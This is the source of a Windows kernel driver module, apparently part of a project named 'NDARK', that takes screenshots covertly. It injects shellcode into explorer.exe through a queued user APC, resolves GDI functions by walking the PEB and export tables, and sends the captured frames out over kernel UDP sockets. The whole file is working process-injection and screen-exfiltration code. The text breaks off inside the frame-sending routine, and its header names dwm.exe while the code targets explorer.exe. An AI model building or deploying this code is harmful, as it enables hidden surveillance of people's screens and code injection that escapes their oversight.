/*++

Module Name:

    ScreenShot.c

Abstract:

    Pure-kernel screen capture via GDI shellcode injection into dwm.exe.

    Pipeline:
      1. Find dwm.exe EPROCESS (console session)
      2. Attach, walk PEB->Ldr, parse PE exports to resolve GDI/User32 APIs
      3. Alloc RW buffer (SC_PARAMS + pixel area) in dwm.exe
      4. Alloc RW page, write shellcode, flip to RX
      5. Queue user APC on first dwm thread
      6. Shellcode fires: GetDC / BitBlt / GetDIBits, writes BGRA pixels
      7. Kernel polls Ready flag via MmCopyVirtualMemory
      8. Read pixel data, free remote allocations
      9. Stream frame over WSK UDP (NDARK1 B|shot / Y| / E|shot protocol)

--*/

#include "ScreenShot.h"
#include "NetControl.h"
#include "Wsk.h"
#include "TcpLink.h"
#include "Ioctl.h"
#include "ShellcodeGdiBytes.h"
#include <ntstrsafe.h>
#include "../Shared/NdarkLog.h"
#include "CompatPool.h"

#define LOG(fmt, ...) NDARK_LOG_INFO(fmt, ##__VA_ARGS__)
#define TAG_SS 'sSnD'

/* ===================================================================
   Undocumented kernel API declarations (stable Win7 .. Win11)
   =================================================================== */

NTKERNELAPI PPEB    PsGetProcessPeb(_In_ PEPROCESS Process);
NTKERNELAPI HANDLE  PsGetProcessId (_In_ PEPROCESS Process);

NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(
    _In_ HANDLE ProcessId, _Outptr_ PEPROCESS* Process);

NTKERNELAPI NTSTATUS PsLookupThreadByThreadId(
    _In_ HANDLE ThreadId, _Outptr_ PETHREAD* Thread);

NTSTATUS NTAPI MmCopyVirtualMemory(
    _In_  PEPROCESS FromProcess,  _In_  PVOID    FromAddress,
    _In_  PEPROCESS ToProcess,    _Out_ PVOID    ToAddress,
    _In_  SIZE_T    BufferSize,   _In_  KPROCESSOR_MODE Mode,
    _Out_ PSIZE_T   NumberOfBytesCopied);

NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(
    _In_ ULONG Class, _Inout_ PVOID Info,
    _In_ ULONG Length, _Out_opt_ PULONG ReturnLength);

NTSYSAPI NTSTATUS NTAPI ZwProtectVirtualMemory(
    _In_    HANDLE   ProcessHandle,
    _Inout_ PVOID*   BaseAddress,
    _Inout_ PSIZE_T  RegionSize,
    _In_    ULONG    NewProtect,
    _Out_   PULONG   OldProtect);

/* KAPC_STATE / KeStackAttachProcess live in ntifs.h which conflicts
   with the project's ntddk.h-only setup.  Declare them manually.   */

typedef struct _KAPC_STATE {
    LIST_ENTRY ApcListHead[2];
    PEPROCESS  Process;
    UCHAR      Flags[4];
} KAPC_STATE, *PKAPC_STATE;

NTKERNELAPI VOID KeStackAttachProcess(
    _Inout_ PEPROCESS   Process,
    _Out_   PKAPC_STATE ApcState);

NTKERNELAPI VOID KeUnstackDetachProcess(
    _In_ PKAPC_STATE ApcState);

/* Zw virtual-memory APIs (ntifs.h only) */

NTSYSAPI NTSTATUS NTAPI ZwAllocateVirtualMemory(
    _In_    HANDLE    ProcessHandle,
    _Inout_ PVOID*    BaseAddress,
    _In_    ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T   RegionSize,
    _In_    ULONG     AllocationType,
    _In_    ULONG     Protect);

NTSYSAPI NTSTATUS NTAPI ZwFreeVirtualMemory(
    _In_    HANDLE  ProcessHandle,
    _Inout_ PVOID*  BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_    ULONG   FreeType);

/* APC types and functions -- exported by ntoskrnl, absent from ntddk.h */

typedef VOID (NTAPI *PKNORMAL_ROUTINE)(
    _In_opt_ PVOID NormalContext,
    _In_opt_ PVOID SystemArgument1,
    _In_opt_ PVOID SystemArgument2);

typedef enum _KAPC_ENVIRONMENT {
    OriginalApcEnvironment,
    AttachedApcEnvironment,
    CurrentApcEnvironment,
    InsertApcEnvironment
} KAPC_ENVIRONMENT;

NTKERNELAPI VOID KeInitializeApc(
    _Out_    PKAPC              Apc,
    _In_     PETHREAD           Thread,
    _In_     KAPC_ENVIRONMENT   Environment,
    _In_     PVOID              KernelRoutine,
    _In_opt_ PVOID              RundownRoutine,
    _In_opt_ PKNORMAL_ROUTINE   NormalRoutine,
    _In_     KPROCESSOR_MODE    ApcMode,
    _In_opt_ PVOID              NormalContext);

NTKERNELAPI BOOLEAN KeInsertQueueApc(
    _Inout_  PKAPC    Apc,
    _In_opt_ PVOID    SystemArgument1,
    _In_opt_ PVOID    SystemArgument2,
    _In_     KPRIORITY Increment);

/* KeRemoveQueueApc is NOT statically imported.
   Reason: it is exported by ntoskrnl.exe starting with Windows 10 build
   19041 *plus* a later cumulative update; the original 19041.1 RTM does
   not export it, so any driver that imports it cannot load there
   (STATUS_ENTRYPOINT_NOT_FOUND / sc start error 127). We resolve it lazily
   via MmGetSystemRoutineAddress and skip the cancel step gracefully if the
   running kernel does not provide it. */
typedef BOOLEAN (NTAPI *PFN_KeRemoveQueueApc)(_Inout_ PKAPC Apc);

/* ===================================================================
   PEB / LDR structures (x64 offsets, stable Win7 .. Win11)
   =================================================================== */

#pragma warning(push)
#pragma warning(disable: 4201) /* nameless struct/union */

typedef struct _SC_PEB_LDR {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;   /* +0x10 */
} SC_PEB_LDR;

typedef struct _SC_LDR_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;            /* +0x00 */
    LIST_ENTRY     InMemoryOrderLinks;          /* +0x10 */
    LIST_ENTRY     InInitOrderLinks;            /* +0x20 */
    PVOID          DllBase;                     /* +0x30 */
    PVOID          EntryPoint;                  /* +0x38 */
    ULONG          SizeOfImage;                 /* +0x40 */
    ULONG          _pad0;
    UNICODE_STRING FullDllName;                 /* +0x48 */
    UNICODE_STRING BaseDllName;                 /* +0x58 */
} SC_LDR_ENTRY;

typedef struct _SC_PEB {
    UCHAR       Reserved1[2];
    UCHAR       BeingDebugged;
    UCHAR       Reserved2[1];
    PVOID       Reserved3[2];
    SC_PEB_LDR* Ldr;                           /* +0x18 */
} SC_PEB;

#pragma warning(pop)

/* ===================================================================
   SC_PARAMS - shared layout between kernel and shellcode.
   MUST match the struct in ShellcodeGdi.c exactly.
   =================================================================== */

typedef struct _SC_PARAMS {
    ULONG64  pfnGetDC;                  /* +0x00  user32  */
    ULONG64  pfnReleaseDC;              /* +0x08          */
    ULONG64  pfnCreateCompatibleDC;     /* +0x10  gdi32   */
    ULONG64  pfnDeleteDC;              /* +0x18          */
    ULONG64  pfnCreateCompatibleBitmap; /* +0x20          */
    ULONG64  pfnSelectObject;           /* +0x28          */
    ULONG64  pfnBitBlt;                 /* +0x30          */
    ULONG64  pfnGetDIBits;              /* +0x38          */
    ULONG64  pfnDeleteObject;           /* +0x40          */
    ULONG64  pfnGetSystemMetrics;       /* +0x48  user32  */
    ULONG    Width;                     /* +0x50          */
    ULONG    Height;                    /* +0x54          */
    ULONG    Stride;                    /* +0x58          */
    ULONG    FrameSize;                 /* +0x5C          */
    volatile LONG  Ready;               /* +0x60          */
    volatile LONG  Status;              /* +0x64          */
    UCHAR    Pixels[1];                 /* +0x68  BGRA    */
} SC_PARAMS;

#define SC_PIXEL_OFFSET  FIELD_OFFSET(SC_PARAMS, Pixels)
#define SC_MAX_PIXELS    (3840u * 2160u)
#define SC_MAX_FRAME     (SC_MAX_PIXELS * 4u)
#define SC_ALLOC_SIZE    (SC_PIXEL_OFFSET + SC_MAX_FRAME)  /* ~32 MB */

/* ===================================================================
   (1)  Find dwm.exe
   =================================================================== */

typedef struct _SPI_ENTRY {
    ULONG          NextEntryOffset;
    ULONG          NumberOfThreads;
    LARGE_INTEGER  Reserved[3];
    LARGE_INTEGER  CreateTime;
    LARGE_INTEGER  UserTime;
    LARGE_INTEGER  KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY      BasePriority;
    HANDLE         UniqueProcessId;
    HANDLE         InheritedFromUniqueProcessId;
    ULONG          HandleCount;
    ULONG          SessionId;
} SPI_ENTRY;

/* Thread entry that follows SPI_ENTRY in SystemProcessInformation.
   The thread array starts at offset 0x100 from the process entry on x64. */
#define SPI_THREAD_ARRAY_OFFSET  0x100
#define DWM_MAX_THREADS  32

typedef struct _SPI_THREAD {
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG         WaitTime;
    ULONG         _pad0;
    PVOID         StartAddress;
    HANDLE        ProcessId;
    HANDLE        ThreadId;
    KPRIORITY     Priority;
    LONG          BasePriority;
    ULONG         ContextSwitches;
    ULONG         State;
    ULONG         WaitReason;
    ULONG         _pad1;
} SPI_THREAD;

static BOOLEAN
IsTargetName(_In_ PCWSTR buf, _In_ USHORT chars)
{
    /* Match "explorer.exe" (12 chars) — regular user process that can
     * see the composited desktop via GDI GetDC(NULL) + BitBlt.
     * dwm.exe is the compositor itself and returns black from GetDC. */
    if (chars != 12) return FALSE;
    return (buf[0] == L'e' || buf[0] == L'E') &&
           (buf[1] == L'x' || buf[1] == L'X') &&
           (buf[2] == L'p' || buf[2] == L'P') &&
           (buf[3] == L'l' || buf[3] == L'L') &&
           (buf[4] == L'o' || buf[4] == L'O') &&
           (buf[5] == L'r' || buf[5] == L'R') &&
           (buf[6] == L'e' || buf[6] == L'E') &&
           (buf[7] == L'r' || buf[7] == L'R') &&
            buf[8] == L'.'  &&
           (buf[9] == L'e' || buf[9] == L'E') &&
           (buf[10] == L'x' || buf[10] == L'X') &&
           (buf[11] == L'e' || buf[11] == L'E');
}

static NTSTATUS
FindTargetProcess(_Outptr_ PEPROCESS* OutProcess,
                  _Out_writes_(DWM_MAX_THREADS) HANDLE* OutTids,
                  _Out_ ULONG* OutTidCount)
{
    NTSTATUS status;
    ULONG    size = 0;
    PVOID    buf  = NULL;

    *OutProcess  = NULL;
    *OutTidCount = 0;

    status = ZwQuerySystemInformation(5 /*SystemProcessInformation*/,
                                      NULL, 0, &size);
    if (size == 0) return STATUS_UNSUCCESSFUL;

    size += 0x10000;
    buf = ExAllocatePool2(POOL_FLAG_PAGED, size, TAG_SS);
    if (!buf) return STATUS_INSUFFICIENT_RESOURCES;

    status = ZwQuerySystemInformation(5, buf, size, &size);
    if (!NT_SUCCESS(status)) {
        ExFreePoolWithTag(buf, TAG_SS);
        return status;
    }

    SPI_ENTRY* p = (SPI_ENTRY*)buf;
    for (;;) {
        if (p->ImageName.Buffer && p->ImageName.Length > 0) {
            if (IsTargetName(p->ImageName.Buffer,
                             p->ImageName.Length / sizeof(WCHAR))) {
                /* Skip session 0 — it has no visible desktop */
                if (p->SessionId >= 1) {
                PEPROCESS proc = NULL;
                if (NT_SUCCESS(PsLookupProcessByProcessId(
                        p->UniqueProcessId, &proc))) {
                    if (PsGetProcessPeb(proc)) {
                        *OutProcess = proc;
                        /* Collect ALL thread IDs */
                        if (p->NumberOfThreads > 0) {
                            SPI_THREAD* ta = (SPI_THREAD*)(
                                (PUCHAR)p + SPI_THREAD_ARRAY_OFFSET);
                            ULONG n = min(p->NumberOfThreads, DWM_MAX_THREADS);
                            ULONG j;
                            for (j = 0; j < n; j++)
                                OutTids[j] = ta[j].ThreadId;
                            *OutTidCount = n;
                        }
                        break;
                    }
                    ObDereferenceObject(proc);
                }
                } /* SessionId >= 1 */
            }
        }
        if (p->NextEntryOffset == 0) break;
        p = (SPI_ENTRY*)((PUCHAR)p + p->NextEntryOffset);
    }

    ExFreePoolWithTag(buf, TAG_SS);
    return *OutProcess ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}

/* ===================================================================
   (2)  PEB / Ldr walking  +  PE export resolution
   =================================================================== */

/*
 * Find a module by BaseDllName (case-insensitive).
 * MUST be called WHILE ATTACHED to the target process.
 */
static PVOID
FindModuleBase(_In_ PEPROCESS Process, _In_ PCWSTR DllName)
{
    SC_PEB* peb = (SC_PEB*)PsGetProcessPeb(Process);
    if (!peb) return NULL;

    PVOID  result     = NULL;
    SIZE_T dllNameLen = wcslen(DllName);

    __try {
        SC_PEB_LDR* ldr = peb->Ldr;
        if (!ldr || !ldr->Initialized) return NULL;

        LIST_ENTRY* head = &ldr->InLoadOrderModuleList;
        LIST_ENTRY* e;
        for (e = head->Flink; e && e != head; e = e->Flink) {
            SC_LDR_ENTRY* mod =
                CONTAINING_RECORD(e, SC_LDR_ENTRY, InLoadOrderLinks);
            if (!mod->BaseDllName.Buffer || mod->BaseDllName.Length == 0)
                continue;
            USHORT chars = mod->BaseDllName.Length / sizeof(WCHAR);
            if ((SIZE_T)chars != dllNameLen) continue;

            BOOLEAN match = TRUE;
            USHORT  i;
            for (i = 0; i < chars; i++) {
                WCHAR a = mod->BaseDllName.Buffer[i];
                WCHAR b = DllName[i];
                if (a >= L'a' && a <= L'z') a -= 32;
                if (b >= L'a' && b <= L'z') b -= 32;
                if (a != b) { match = FALSE; break; }
            }
            if (match) { result = mod->DllBase; break; }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        result = NULL;
    }
    return result;
}

/*
 * Compare two null-terminated ANSI strings (both may be in user memory).
 */
static BOOLEAN
StrEqA(_In_ const CHAR* a, _In_ const CHAR* b)
{
    while (*a && *b) {
        if (*a != *b) return FALSE;
        a++; b++;
    }
    return *a == *b;
}

/*
 * Parse PE export table of a user-mode DLL and find a function by name.
 * Handles forwarders (e.g., gdi32.dll -> api-ms-* -> gdi32full.dll).
 * MUST be called WHILE ATTACHED.
 */
static ULONG64
FindExport(_In_  PEPROCESS Process,
           _In_  PVOID     ModuleBase,
           _In_  PCSTR     FuncName,
           _In_  int       Depth)
{
    PUCHAR  base;
    ULONG64 result = 0;

    if (!ModuleBase || !FuncName || Depth > 3) return 0;
    base = (PUCHAR)ModuleBase;

    __try {
        LONG   peOfs;
        PUCHAR pe;
        ULONG  expRva, expSize;
        PUCHAR expDir;
        ULONG  nNames, aFuncs, aNames, aOrds;
        ULONG* nameRvas;
        USHORT* ordinals;
        ULONG* funcRvas;
        ULONG  i;

        /* DOS header */
        if (*(USHORT*)base != 0x5A4D) return 0;
        peOfs = *(LONG*)(base + 0x3C);
        if (peOfs <= 0 || peOfs > 0x1000) return 0;

        /* PE signature + PE32+ magic */
        pe = base + peOfs;
        if (*(ULONG*)pe       != 0x00004550) return 0;
        if (*(USHORT*)(pe + 0x18) != 0x20B)  return 0;

        /* Export directory */
        expRva  = *(ULONG*)(pe + 0x18 + 0x70);
        expSize = *(ULONG*)(pe + 0x18 + 0x74);
        if (!expRva || !expSize) return 0;

        expDir   = base + expRva;
        nNames   = *(ULONG*)(expDir + 0x18);
        aFuncs   = *(ULONG*)(expDir + 0x1C);
        aNames   = *(ULONG*)(expDir + 0x20);
        aOrds    = *(ULONG*)(expDir + 0x24);

        nameRvas = (ULONG*)(base + aNames);
        ordinals = (USHORT*)(base + aOrds);
        funcRvas = (ULONG*)(base + aFuncs);

        for (i = 0; i < nNames; i++) {
            CHAR* name = (CHAR*)(base + nameRvas[i]);
            if (!StrEqA(name, FuncName)) continue;

            {
                ULONG funcRva = funcRvas[ordinals[i]];

                /* Forwarder? RVA inside export directory range. */
                if (funcRva >= expRva && funcRva < expRva + expSize) {
                    CHAR* fwd = (CHAR*)(base + funcRva);
                    CHAR  fwdMod[128];
                    CHAR  fwdFn[128];
                    int   dot = -1, k;

                    for (k = 0; k < 126; k++) fwdMod[k] = 0;
                    for (k = 0; k < 126; k++) fwdFn[k]  = 0;

                    for (k = 0; k < 126 && fwd[k]; k++) {
                        if (fwd[k] == '.') { dot = k; break; }
                        fwdMod[k] = fwd[k];
                    }
                    if (dot > 0) {
                        for (k = 0; k < 126 && fwd[dot + 1 + k]; k++)
                            fwdFn[k] = fwd[dot + 1 + k];

                        /* Convert module name to wide + append .DLL */
                        {
                            WCHAR wMod[140];
                            SIZE_T wLen;
                            PVOID  fwdBase;

                            for (k = 0; k < 139; k++) wMod[k] = 0;
                            for (k = 0; fwdMod[k] && k < 128; k++)
                                wMod[k] = (WCHAR)fwdMod[k];
                            wLen = wcslen(wMod);
                            if (wLen > 0 && (wLen < 4 || wMod[wLen - 4] != L'.')) {
                                wMod[wLen]     = L'.';
                                wMod[wLen + 1] = L'D';
                                wMod[wLen + 2] = L'L';
                                wMod[wLen + 3] = L'L';
                                wMod[wLen + 4] = 0;
                            }

                            fwdBase = FindModuleBase(Process, wMod);

                            /*
                             * API-set fallback: "api-ms-win-gdi-*" maps to
                             * gdi32full.dll; "api-ms-win-core-*" maps to
                             * kernelbase.dll.  These virtual DLLs are NOT in
                             * PEB -> Ldr by their api-ms-* name.
                             */
                            if (!fwdBase &&
                                wLen >= 4 &&
                                (wMod[0] == L'A' || wMod[0] == L'a') &&
                                (wMod[1] == L'P' || wMod[1] == L'p') &&
                                (wMod[2] == L'I' || wMod[2] == L'i') &&
                                 wMod[3] == L'-') {
                                fwdBase = FindModuleBase(Process, L"GDI32FULL.DLL");
                                if (!fwdBase)
                                    fwdBase = FindModuleBase(Process, L"KERNELBASE.DLL");
                                if (!fwdBase)
                                    fwdBase = FindModuleBase(Process, L"KERNEL32.DLL");
                            }

                            if (fwdBase)
                                result = FindExport(Process, fwdBase,
                                                    fwdFn, Depth + 1);
                        }
                    }
                } else {
                    result = (ULONG64)base + funcRva;
                }
            }
            break;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        result = 0;
    }
    return result;
}

/* ===================================================================
   (3)  Resolve all required GDI / User32 APIs
   =================================================================== */

typedef struct _API_REQ {
    PCWSTR Module;
    PCWSTR Fallback;      /* NULL or alternate module name */
    PCSTR  FuncName;
    ULONG  Offset;        /* byte offset in SC_PARAMS */
} API_REQ;

static const API_REQ g_Apis[] = {
    { L"USER32.DLL",   NULL,          "GetDC",
      FIELD_OFFSET(SC_PARAMS, pfnGetDC) },
    { L"USER32.DLL",   NULL,          "ReleaseDC",
      FIELD_OFFSET(SC_PARAMS, pfnReleaseDC) },
    { L"USER32.DLL",   NULL,          "GetSystemMetrics",
      FIELD_OFFSET(SC_PARAMS, pfnGetSystemMetrics) },
    { L"GDI32FULL.DLL", L"GDI32.DLL", "CreateCompatibleDC",
      FIELD_OFFSET(SC_PARAMS, pfnCreateCompatibleDC) },
    { L"GDI32FULL.DLL", L"GDI32.DLL", "DeleteDC",
      FIELD_OFFSET(SC_PARAMS, pfnDeleteDC) },
    { L"GDI32FULL.DLL", L"GDI32.DLL", "CreateCompatibleBitmap",
      FIELD_OFFSET(SC_PARAMS, pfnCreateCompatibleBitmap) },
    { L"GDI32FULL.DLL", L"GDI32.DLL", "SelectObject",
      FIELD_OFFSET(SC_PARAMS, pfnSelectObject) },
    { L"GDI32FULL.DLL", L"GDI32.DLL", "BitBlt",
      FIELD_OFFSET(SC_PARAMS, pfnBitBlt) },
    { L"GDI32FULL.DLL", L"GDI32.DLL", "GetDIBits",
      FIELD_OFFSET(SC_PARAMS, pfnGetDIBits) },
    { L"GDI32FULL.DLL", L"GDI32.DLL", "DeleteObject",
      FIELD_OFFSET(SC_PARAMS, pfnDeleteObject) },
};

static NTSTATUS
ResolveApis(_In_ PEPROCESS Process, _Out_ SC_PARAMS* P)
{
    KAPC_STATE apcState;
    NTSTATUS   status = STATUS_SUCCESS;
    ULONG      i;

    KeStackAttachProcess(Process, &apcState);

    for (i = 0; i < RTL_NUMBER_OF(g_Apis); i++) {
        PVOID modBase = FindModuleBase(Process, g_Apis[i].Module);
        if (!modBase && g_Apis[i].Fallback)
            modBase = FindModuleBase(Process, g_Apis[i].Fallback);

        if (!modBase) {
            LOG("ResolveApis: %ws not found", g_Apis[i].Module);
            status = STATUS_DLL_NOT_FOUND;
            break;
        }

        {
            ULONG64 addr = FindExport(Process, modBase,
                                      g_Apis[i].FuncName, 0);
            /* If not in primary module, try fallback module too */
            if (!addr && g_Apis[i].Fallback) {
                PVOID fbBase = FindModuleBase(Process, g_Apis[i].Fallback);
                if (fbBase && fbBase != modBase)
                    addr = FindExport(Process, fbBase,
                                      g_Apis[i].FuncName, 0);
            }
            if (!addr) {
                LOG("ResolveApis: %ws!%s not found",
                    g_Apis[i].Module, g_Apis[i].FuncName);
                status = STATUS_ENTRYPOINT_NOT_FOUND;
                break;
            }
            *(ULONG64*)((PUCHAR)P + g_Apis[i].Offset) = addr;
        }
    }

    KeUnstackDetachProcess(&apcState);   /* ALWAYS detach */
    return status;
}

/* ===================================================================
   (4)  Remote memory helpers
   =================================================================== */

static NTSTATUS
AllocRemote(_In_ PEPROCESS Proc, _In_ SIZE_T Size,
            _In_ ULONG Prot, _Out_ PVOID* Base)
{
    KAPC_STATE as;
    NTSTATUS   st;
    PVOID      base       = NULL;
    SIZE_T     regionSize = Size;

    KeStackAttachProcess(Proc, &as);
    st = ZwAllocateVirtualMemory(ZwCurrentProcess(), &base, 0,
                                  &regionSize, MEM_COMMIT | MEM_RESERVE, Prot);
    KeUnstackDetachProcess(&as);

    if (NT_SUCCESS(st)) *Base = base;
    return st;
}

static VOID
FreeRemote(_In_ PEPROCESS Proc, _In_ PVOID Base)
{
    KAPC_STATE as;
    SIZE_T     size = 0;
    KeStackAttachProcess(Proc, &as);
    ZwFreeVirtualMemory(ZwCurrentProcess(), &Base, &size, MEM_RELEASE);
    KeUnstackDetachProcess(&as);
}

static NTSTATUS
WriteRemote(_In_ PEPROCESS Proc, _In_ PVOID Dst,
            _In_ const VOID* Src, _In_ SIZE_T Len)
{
    SIZE_T n = 0;
    return MmCopyVirtualMemory(PsGetCurrentProcess(), (PVOID)Src,
                               Proc, Dst, Len, KernelMode, &n);
}

static NTSTATUS
ReadRemote(_In_ PEPROCESS Proc, _In_ PVOID Src,
           _Out_ PVOID Dst, _In_ SIZE_T Len)
{
    SIZE_T n = 0;
    return MmCopyVirtualMemory(Proc, Src,
                               PsGetCurrentProcess(), Dst,
                               Len, KernelMode, &n);
}

typedef struct _SS_APC_CONTEXT {
    KAPC       Apc;
    LIST_ENTRY Link;
    volatile LONG Linked;
} SS_APC_CONTEXT, *PSS_APC_CONTEXT;

static KSPIN_LOCK g_ApcLock;
static LIST_ENTRY g_PendingApcs;
static KEVENT     g_ApcDone;
static volatile LONG g_ApcInit = 0;
static volatile LONG g_ApcOutstanding = 0;

static VOID
ScreenApcInit(VOID)
{
    if (InterlockedCompareExchange(&g_ApcInit, 1, 0) == 0) {
        KeInitializeSpinLock(&g_ApcLock);
        InitializeListHead(&g_PendingApcs);
        KeInitializeEvent(&g_ApcDone, NotificationEvent, TRUE);
    }
}

static VOID
ScreenApcLink(_Inout_ PSS_APC_CONTEXT Ctx)
{
    KIRQL oldIrql;

    KeAcquireSpinLock(&g_ApcLock, &oldIrql);
    InsertTailList(&g_PendingApcs, &Ctx->Link);
    InterlockedExchange(&Ctx->Linked, 1);
    KeReleaseSpinLock(&g_ApcLock, oldIrql);
}

static VOID
ScreenApcUnlink(_Inout_ PSS_APC_CONTEXT Ctx)
{
    KIRQL oldIrql;

    KeAcquireSpinLock(&g_ApcLock, &oldIrql);
    if (InterlockedCompareExchange(&Ctx->Linked, 0, 0) != 0) {
        RemoveEntryList(&Ctx->Link);
        InterlockedExchange(&Ctx->Linked, 0);
    }
    KeReleaseSpinLock(&g_ApcLock, oldIrql);
}

static VOID
ScreenApcRelease(_Inout_ PSS_APC_CONTEXT Ctx)
{
    ScreenApcUnlink(Ctx);
    ExFreePoolWithTag(Ctx, TAG_SS);
    if (InterlockedDecrement(&g_ApcOutstanding) == 0)
        KeSetEvent(&g_ApcDone, IO_NO_INCREMENT, FALSE);
}

static VOID
ScreenCancelPendingApcs(VOID)
{
    ScreenApcInit();

    for (;;) {
        KIRQL oldIrql;
        PSS_APC_CONTEXT ctx;

        KeAcquireSpinLock(&g_ApcLock, &oldIrql);
        if (IsListEmpty(&g_PendingApcs)) {
            KeReleaseSpinLock(&g_ApcLock, oldIrql);
            break;
        }
        ctx = CONTAINING_RECORD(g_PendingApcs.Flink, SS_APC_CONTEXT, Link);
        RemoveEntryList(&ctx->Link);
        InterlockedExchange(&ctx->Linked, 0);
        KeReleaseSpinLock(&g_ApcLock, oldIrql);

        {
            static PFN_KeRemoveQueueApc s_pRemoveQueueApc = NULL;
            static LONG s_resolved = 0;
            if (InterlockedCompareExchange(&s_resolved, 0, 0) == 0) {
                UNICODE_STRING name;
                RtlInitUnicodeString(&name, L"KeRemoveQueueApc");
                s_pRemoveQueueApc =
                    (PFN_KeRemoveQueueApc)MmGetSystemRoutineAddress(&name);
                InterlockedExchange(&s_resolved, 1);
            }
            if (s_pRemoveQueueApc) {
                if (s_pRemoveQueueApc(&ctx->Apc))
                    ScreenApcRelease(ctx);
            } else {
                /* Old kernel: cannot revoke a queued APC. The APC will
                   eventually fire and ApcKernelRoutine will call
                   ScreenApcRelease(); we just don't fast-cancel it here. */
            }
        }
    }

    if (InterlockedCompareExchange(&g_ApcOutstanding, 0, 0) > 0)
        KeWaitForSingleObject(&g_ApcDone, Executive, KernelMode, FALSE, NULL);
}

/* ===================================================================
   (5)  APC injection
   =================================================================== */

static VOID NTAPI
ApcKernelRoutine(_In_    PKAPC           Apc,
                 _Inout_ PKNORMAL_ROUTINE* NR,
                 _Inout_ PVOID*          NC,
                 _Inout_ PVOID*          SA1,
                 _Inout_ PVOID*          SA2)
{
    UNREFERENCED_PARAMETER(NR);
    UNREFERENCED_PARAMETER(NC);
    UNREFERENCED_PARAMETER(SA1);
    UNREFERENCED_PARAMETER(SA2);
    ScreenApcRelease(CONTAINING_RECORD(Apc, SS_APC_CONTEXT, Apc));
}

static VOID NTAPI
ApcRundownRoutine(_In_ PKAPC Apc)
{
    ScreenApcRelease(CONTAINING_RECORD(Apc, SS_APC_CONTEXT, Apc));
}

static NTSTATUS
QueueUserApc(_In_ HANDLE   ThreadId,
             _In_ PVOID    Routine,   /* user-mode shellcode addr */
             _In_ PVOID    Context)   /* user-mode params addr    */
{
    PETHREAD thread = NULL;
    PSS_APC_CONTEXT apcCtx;
    BOOLEAN  ok;
    NTSTATUS st;

    st = PsLookupThreadByThreadId(ThreadId, &thread);
    if (!NT_SUCCESS(st) || !thread) return STATUS_NOT_FOUND;

    ScreenApcInit();
    KeClearEvent(&g_ApcDone);
    InterlockedIncrement(&g_ApcOutstanding);

    apcCtx = (PSS_APC_CONTEXT)ExAllocatePool2(POOL_FLAG_NON_PAGED,
                                              sizeof(SS_APC_CONTEXT), TAG_SS);
    if (!apcCtx) {
        if (InterlockedDecrement(&g_ApcOutstanding) == 0)
            KeSetEvent(&g_ApcDone, IO_NO_INCREMENT, FALSE);
        ObDereferenceObject(thread);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    RtlZeroMemory(apcCtx, sizeof(*apcCtx));
    InitializeListHead(&apcCtx->Link);

    KeInitializeApc(&apcCtx->Apc, thread, OriginalApcEnvironment,
                    (PVOID)ApcKernelRoutine, (PVOID)ApcRundownRoutine,
                    (PKNORMAL_ROUTINE)Routine, UserMode, Context);
    ScreenApcLink(apcCtx);

    ok = KeInsertQueueApc(&apcCtx->Apc, NULL, NULL, 0);
    ObDereferenceObject(thread);

    if (!ok) {
        ScreenApcRelease(apcCtx);
        return STATUS_UNSUCCESSFUL;
    }
    return STATUS_SUCCESS;
}

/* ===================================================================
   (6)  Frame sender — diff + RLE + binary (V2 protocol)
   =================================================================== */

/* Previous frame for delta encoding */
static PUCHAR  g_PrevFrame     = NULL;
static ULONG   g_PrevFrameSize = 0;

/* Concurrency guard: prevent multiple captures running at once */
static volatile LONG g_ShotBusy = 0;

/* App can request a keyframe when it detects desync */
volatile LONG g_ForceKeyframe = 0;

/*
 * RLE-compress a DWORD array.
 * Format: [count:2B LE][value:4B] × N  (6 bytes per run)
 * Returns compressed size in bytes, 0 on error.
 */
static ULONG
RleCompressDwords(_In_  const ULONG* Src, _In_ ULONG DwordCount,
                  _Out_ UCHAR* Dst, _In_ ULONG DstCapacity)
{
    ULONG out = 0;
    ULONG i   = 0;

    while (i < DwordCount) {
        ULONG val = Src[i];
        ULONG run = 1;
        while (i + run < DwordCount && run < 65535 && Src[i + run] == val)
            run++;
        if (out + 6 > DstCapacity) return 0;  /* overflow */
        *(USHORT*)(Dst + out) = (USHORT)run;
        *(ULONG*)(Dst + out + 2) = val;
        out += 6;
        i += run;
    }
    return out;
}

static NTSTATUS
SendFrame(_In_ ULONG W, _In_ ULONG H,
          _In_ const UCHAR* Px, _In_ ULONG PxLen)
{
    static volatile LONG s_FrameId = 0;
    ULONG       fid;
    PWSK_SOCKET sock = NULL;
    NTSTATUS    st;
    SOCKADDR_IN local, peer;
    ULONG       chunkSz, chunkCnt, i;
    SIZE_T      sent;
    CHAR        hdr[256];
    UCHAR*      pkt = NULL;
    BOOLEAN     isKey;
    PUCHAR      diffBuf  = NULL;
    PUCHAR      compBuf  = NULL;
    ULONG       compSize = 0;
    ULONG       dwordCnt;

    fid = (ULONG)InterlockedIncrement(&s_FrameId);
    dwordCnt = PxLen / 4;

    /* Keyframe if first frame or resolution changed */
    isKey = (!g_PrevFrame || g_PrevFrameSize != PxLen);

    /* Allocate diff buffer */
    diffBuf = (PUCHAR)ExAllocatePool2(POOL_FLAG_PAGED, PxLen, TAG_SS);
    if (!diffBuf) return STATUS_INSUFFICIENT_RESOURCES;

    if (isKey) {
        RtlCopyMemory(diffBuf, Px, PxLen);
    } else {
        /* XOR with previous frame */
        ULONG* d = (ULONG*)diffBuf;
        const ULONG* c = (const ULONG*)Px;
        const ULONG* p = (const ULONG*)g_PrevFrame;
        for (i = 0; i < dwordCnt; i++)
            d[i] = c[i] ^ p[i];
    }

    /* RLE compress — worst case 6 bytes per DWORD (all unique) */
    {
        ULONG compCapacity = dwordCnt * 6;
        compBuf = (PUCHAR)ExAllocatePool2(POOL_FLAG_PAGED, compCapacity, TAG_SS);
        if (!compBuf) {
            ExFreePoolWithTag(diffBuf, TAG_SS);
